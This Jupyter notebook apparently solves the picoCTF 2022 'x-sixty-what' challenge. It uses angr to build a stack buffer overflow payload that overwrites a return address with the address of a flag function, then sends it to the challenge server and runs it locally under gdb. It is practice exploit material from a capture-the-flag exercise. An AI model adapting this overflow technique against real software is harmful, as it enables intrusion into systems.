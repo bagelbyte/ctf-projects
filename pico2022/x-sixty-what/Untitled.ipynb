{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 163,
   "id": "745990e7-086b-4365-b58d-7a4acd5f1939",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pwn import *\n",
    "import angr, monkeyhex, claripy\n",
    "context(arch='x86', os='linux')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 245,
   "id": "faeaee40-e964-4c56-9596-61564887986a",
   "metadata": {},
   "outputs": [],
   "source": [
    "p = angr.Project('./vuln', auto_load_libs=False)\n",
    "flag_func_addr = p.loader.main_object.get_symbol('flag').rebased_addr"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 369,
   "id": "ba569671-a8b6-4932-920e-84cb8800aa95",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "        flag:\n",
      "401236  endbr64 \n",
      "40123a  push    rbp\n",
      "40123b  mov     rbp, rsp\n",
      "40123e  sub     rsp, 0x50\n",
      "401242  lea     rsi, [0x402008]\n",
      "401249  lea     rdi, [0x40200a]\n",
      "401250  call    fopen\n"
     ]
    }
   ],
   "source": [
    "p.factory.block(flag_func_addr).pp()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 370,
   "id": "a7cb330b-8a0c-4d7f-8c6f-c7e37eea2f42",
   "metadata": {},
   "outputs": [],
   "source": [
    "#gonna manually set it to this because we are having some weird issues going to 0x401236\n",
    "flag_func_addr = 0x40123a"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 371,
   "id": "9fc16c76-94c0-4026-bc52-046e192f855a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0x4012b2"
      ]
     },
     "execution_count": 371,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "p.loader.main_object.get_symbol('vuln').rebased_addr"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 372,
   "id": "9df2f11a-83a6-4dbc-a152-c253c8254386",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING | 2022-03-18 11:02:57,897 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff9c with 4 unconstrained bytes referenced from 0x401159 (_start+0x9 in vuln (0x401159))\n",
      "WARNING | 2022-03-18 11:02:58,191 | angr.project | Address is already hooked, during hook(0x500030, <SimProcedure gets>). Re-hooking.\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "0x500030"
      ]
     },
     "execution_count": 372,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "simgr = p.factory.simgr(p.factory.entry_state(add_options={angr.options.MEMORY_SYMBOLIC_BYTES_MAP, angr.options.REVERSE_MEMORY_HASH_MAP, angr.options.REVERSE_MEMORY_NAME_MAP}))\n",
    "simgr.explore(find=0x4012b2) #get to the vuln function\n",
    "\n",
    "#at this point, we are at the beginning of the function, so we should take note of the value of RSP because thats what we want to overwrite\n",
    "found = simgr.found[0]\n",
    "vuln_return_address = found.solver.eval(found.regs.rsp)\n",
    "found.memory.load(vuln_return_address, 8)\n",
    "\n",
    "symbolic_vars = []\n",
    "\n",
    "#now we want to handle the gets call\n",
    "\n",
    "class gets(angr.SimProcedure):\n",
    "    def run(self, dst):\n",
    "        print(dst)\n",
    "        #taking the difference in address between dst and vuln_return_address, to give us how long our input should be\n",
    "        length = (vuln_return_address - dst.to_claripy().args[0] + 8) * 8 #plus 8 cuz we want to overwrite the vuln_return_address value\n",
    "        print(f'length is {length}')\n",
    "        #now gonna create a bitvector of that size \n",
    "        gets_value = claripy.BVS('getsvalue', length, explicit_name=True)\n",
    "        symbolic_vars.append(gets_value)\n",
    "        print(gets_value)\n",
    "        self.state.memory.store(dst, gets_value)\n",
    "        print(self.state.memory.load(vuln_return_address, 8))\n",
    "        print(claripy.BVV(flag_func_addr, 64).reversed)\n",
    "        self.state.add_constraints(self.state.memory.load(vuln_return_address, 8) == claripy.BVV(flag_func_addr, 64).reversed)\n",
    "        return dst\n",
    "        \n",
    "p.hook_symbol('gets', gets())\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 373,
   "id": "386e7df3-b45e-44dd-9def-48b4313302ad",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<SAO <BV64 0x7fffffffffeff00>>\n",
      "length is 640\n",
      "<BV640 getsvalue>\n",
      "<BV64 getsvalue[63:0]>\n",
      "<BV64 0x3a12400000000000>\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "<SimulationManager with 1 found>"
      ]
     },
     "execution_count": 373,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#now we are going to step the vuln function once so the gets simproc runs\n",
    "simgr.step(stash='found', n=3)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 374,
   "id": "ccface26-2e9b-4602-9f76-f34682ccaa6c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00:\\x12@\\x00\\x00\\x00\\x00\\x00'"
      ]
     },
     "execution_count": 374,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "payload = simgr.found[0].solver.eval(symbolic_vars[0], cast_to=bytes)\n",
    "payload"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 375,
   "id": "7be1ec57-bb3f-4ede-a733-4be47117c3b4",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Opening connection to saturn.picoctf.net on port 60992\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO    | 2022-03-18 11:03:03,798 | pwnlib.tubes.remote.remote.139768182354800 | Opening connection to saturn.picoctf.net on port 60992\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Opening connection to saturn.picoctf.net on port 60992: Trying 18.217.86.78\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO    | 2022-03-18 11:03:03,800 | pwnlib.tubes.remote.remote.139768182354800 | Opening connection to saturn.picoctf.net on port 60992: Trying 18.217.86.78\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] Opening connection to saturn.picoctf.net on port 60992: Done\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO    | 2022-03-18 11:03:03,818 | pwnlib.tubes.remote.remote.139768182354800 | Opening connection to saturn.picoctf.net on port 60992: Done\n"
     ]
    }
   ],
   "source": [
    "io = remote(\"saturn.picoctf.net\", 60992)\n",
    "io.clean()\n",
    "io.sendline(payload)\n",
    "io.clean()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 382,
   "id": "58246394-9b1e-4117-bfba-7ad768682bbd",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b''"
      ]
     },
     "execution_count": 382,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 383,
   "id": "9536ab99-51cb-4103-b5e4-d7327fdf2716",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] Closed connection to saturn.picoctf.net port 60992\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO    | 2022-03-18 11:03:15,672 | pwnlib.tubes.remote.remote.139768182354800 | Closed connection to saturn.picoctf.net port 60992\n"
     ]
    },
    {
     "ename": "EOFError",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mBrokenPipeError\u001b[0m                           Traceback (most recent call last)",
      "File \u001b[0;32m~/.virtualenvs/pwntools/lib/python3.8/site-packages/pwnlib/tubes/sock.py:65\u001b[0m, in \u001b[0;36msock.send_raw\u001b[0;34m(self, data)\u001b[0m\n\u001b[1;32m     64\u001b[0m \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[0;32m---> 65\u001b[0m     \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43msock\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43msendall\u001b[49m\u001b[43m(\u001b[49m\u001b[43mdata\u001b[49m\u001b[43m)\u001b[49m\n\u001b[1;32m     66\u001b[0m \u001b[38;5;28;01mexcept\u001b[39;00m \u001b[38;5;167;01mIOError\u001b[39;00m \u001b[38;5;28;01mas\u001b[39;00m e:\n",
      "\u001b[0;31mBrokenPipeError\u001b[0m: [Errno 32] Broken pipe",
      "\nDuring handling of the above exception, another exception occurred:\n",
      "\u001b[0;31mEOFError\u001b[0m                                  Traceback (most recent call last)",
      "Input \u001b[0;32mIn [383]\u001b[0m, in \u001b[0;36m<cell line: 1>\u001b[0;34m()\u001b[0m\n\u001b[0;32m----> 1\u001b[0m \u001b[43mio\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43msendline\u001b[49m\u001b[43m(\u001b[49m\u001b[43mpayload\u001b[49m\u001b[43m)\u001b[49m\n",
      "File \u001b[0;32m~/.virtualenvs/pwntools/lib/python3.8/site-packages/pwnlib/tubes/tube.py:798\u001b[0m, in \u001b[0;36mtube.sendline\u001b[0;34m(self, line)\u001b[0m\n\u001b[1;32m    780\u001b[0m \u001b[38;5;124mr\u001b[39m\u001b[38;5;124;03m\"\"\"sendline(data)\u001b[39;00m\n\u001b[1;32m    781\u001b[0m \n\u001b[1;32m    782\u001b[0m \u001b[38;5;124;03mShorthand for ``t.send(data + t.newline)``.\u001b[39;00m\n\u001b[0;32m   (...)\u001b[0m\n\u001b[1;32m    793\u001b[0m \u001b[38;5;124;03m    b'hello\\r\\n'\u001b[39;00m\n\u001b[1;32m    794\u001b[0m \u001b[38;5;124;03m\"\"\"\u001b[39;00m\n\u001b[1;32m    796\u001b[0m line \u001b[38;5;241m=\u001b[39m packing\u001b[38;5;241m.\u001b[39m_need_bytes(line)\n\u001b[0;32m--> 798\u001b[0m \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43msend\u001b[49m\u001b[43m(\u001b[49m\u001b[43mline\u001b[49m\u001b[43m \u001b[49m\u001b[38;5;241;43m+\u001b[39;49m\u001b[43m \u001b[49m\u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mnewline\u001b[49m\u001b[43m)\u001b[49m\n",
      "File \u001b[0;32m~/.virtualenvs/pwntools/lib/python3.8/site-packages/pwnlib/tubes/tube.py:777\u001b[0m, in \u001b[0;36mtube.send\u001b[0;34m(self, data)\u001b[0m\n\u001b[1;32m    775\u001b[0m     \u001b[38;5;28;01melse\u001b[39;00m:\n\u001b[1;32m    776\u001b[0m         \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mindented(fiddling\u001b[38;5;241m.\u001b[39mhexdump(data), level \u001b[38;5;241m=\u001b[39m logging\u001b[38;5;241m.\u001b[39mDEBUG)\n\u001b[0;32m--> 777\u001b[0m \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43msend_raw\u001b[49m\u001b[43m(\u001b[49m\u001b[43mdata\u001b[49m\u001b[43m)\u001b[49m\n",
      "File \u001b[0;32m~/.virtualenvs/pwntools/lib/python3.8/site-packages/pwnlib/tubes/sock.py:70\u001b[0m, in \u001b[0;36msock.send_raw\u001b[0;34m(self, data)\u001b[0m\n\u001b[1;32m     68\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m e\u001b[38;5;241m.\u001b[39merrno \u001b[38;5;129;01min\u001b[39;00m eof_numbers \u001b[38;5;129;01mor\u001b[39;00m \u001b[38;5;124m'\u001b[39m\u001b[38;5;124mSocket is closed\u001b[39m\u001b[38;5;124m'\u001b[39m \u001b[38;5;129;01min\u001b[39;00m e\u001b[38;5;241m.\u001b[39margs:\n\u001b[1;32m     69\u001b[0m     \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mshutdown(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124msend\u001b[39m\u001b[38;5;124m\"\u001b[39m)\n\u001b[0;32m---> 70\u001b[0m     \u001b[38;5;28;01mraise\u001b[39;00m \u001b[38;5;167;01mEOFError\u001b[39;00m\n\u001b[1;32m     71\u001b[0m \u001b[38;5;28;01melse\u001b[39;00m:\n\u001b[1;32m     72\u001b[0m     \u001b[38;5;28;01mraise\u001b[39;00m\n",
      "\u001b[0;31mEOFError\u001b[0m: "
     ]
    }
   ],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "489ad3f7-291c-46c7-a6e6-d2b075aca4f2",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 388,
   "id": "dcfa3f4e-ae7b-4518-abed-f95f29ac4772",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Starting local process '/usr/bin/gdbserver'\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO    | 2022-03-18 11:08:01,774 | pwnlib.tubes.process.process.139768178999360 | Starting local process '/usr/bin/gdbserver'\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] Starting local process '/usr/bin/gdbserver': pid 354868\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO    | 2022-03-18 11:08:01,796 | pwnlib.tubes.process.process.139768178999360 | Starting local process '/usr/bin/gdbserver': pid 354868\n",
      "DEBUG   | 2022-03-18 11:08:01,803 | pwnlib.gdb | Wrote gdb script to '/tmp/pwn7v1dw9o4.gdb'\n",
      "target remote 127.0.0.1:45225\n",
      "\n",
      "break vuln\n",
      "c\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] running in new terminal: ['/usr/bin/gdb', '-q', './vuln', '-x', '/tmp/pwn7v1dw9o4.gdb']\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO    | 2022-03-18 11:08:01,804 | pwnlib.gdb | running in new terminal: ['/usr/bin/gdb', '-q', './vuln', '-x', '/tmp/pwn7v1dw9o4.gdb']\n",
      "DEBUG   | 2022-03-18 11:08:01,805 | pwnlib.util.misc | Created script for new terminal:\n",
      "#!/home/bork/.virtualenvs/pwntools/bin/python\n",
      "import os\n",
      "os.execve('/usr/bin/gdb', ['/usr/bin/gdb', '-q', './vuln', '-x', '/tmp/pwn7v1dw9o4.gdb'], os.environ)\n",
      "\n",
      "DEBUG   | 2022-03-18 11:08:01,807 | pwnlib.util.misc | Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/tmp/tmp58ranxc_']\n"
     ]
    }
   ],
   "source": [
    "r = gdb.debug('./vuln', '''\n",
    "break vuln\n",
    "c\n",
    "''')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 386,
   "id": "cf724376-c2e0-4c17-8dfb-184c5c37707b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'Welcome to 64-bit. Give me a string that gets you the flag: \\n'"
      ]
     },
     "execution_count": 386,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "r.clean()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 389,
   "id": "286a9966-30d1-45c5-a3e0-54ad40845749",
   "metadata": {},
   "outputs": [],
   "source": [
    "r.sendline(payload)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "307c8f57-79b6-4ce0-a95f-20788cda7fd2",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bdab5bb9-8eed-4685-9c26-39aa25cede21",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
